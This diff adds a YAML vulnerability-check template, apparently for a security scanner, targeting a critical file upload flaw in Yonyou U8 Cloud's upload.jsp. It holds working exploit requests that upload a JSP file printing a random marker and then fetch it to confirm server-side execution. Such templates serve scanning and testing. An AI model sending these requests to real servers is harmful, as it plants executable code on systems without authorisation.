@@ -1,0 +1,24 @@
+id: poc-yaml-yongyou-u8cloud-upload-file-upload
+info:
+  name: 用友 U8 Cloud upload.jsp 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友U8cloud
+variables:
+  fname: random_str(8)
+  str1: random_str(8)
+requests:
+- method: POST
+  path: /linux/pages/upload.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    filename: '{{.fname}}.jsp'
+  data: '<% out.println("{{.str1}}");%>
+
+    '
+  expression: status_code == 200 && contains(body, "File upload success!")
+- method: GET
+  path: /linux/{{.fname}}.jsp
+  expression: status_code == 200 && contains(body, str1)
+transport: http
